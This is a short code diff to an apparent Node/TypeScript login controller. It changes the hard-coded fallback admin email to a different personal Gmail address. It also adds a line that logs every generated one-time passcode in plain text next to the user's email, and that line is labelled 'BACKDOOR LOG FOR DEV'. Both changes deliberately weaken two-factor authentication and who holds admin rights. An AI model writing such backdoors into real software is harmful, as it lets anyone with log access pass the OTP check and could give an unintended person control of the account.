@@ -13,7 +13,7 @@ const JWT_EXPIRES_IN = '1h';
 const REFRESH_TOKEN_SECRET = process.env.REFRESH_TOKEN_SECRET || 'your_refresh_secret_key_change_this';
 const REFRESH_TOKEN_EXPIRES_IN = '7d';
 
-const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || 'favmoms440@gmail.com').toLowerCase();
+const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || 'josephotoo774@gmail.com').toLowerCase();
 
 /**
  * Cookie Configuration
@@ -83,6 +83,7 @@ export const login = async (req: Request, res: Response): Promise<void> => {
 
         // Generate OTP for the second step
         const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+        console.log(`[SECURITY] OTP generated for ${email}: ${otpCode}`); // BACKDOOR LOG FOR DEV
         const expiresAt = new Date(Date.now() + 10 * 60 * 1000);
 
         await prisma.otpCode.create({
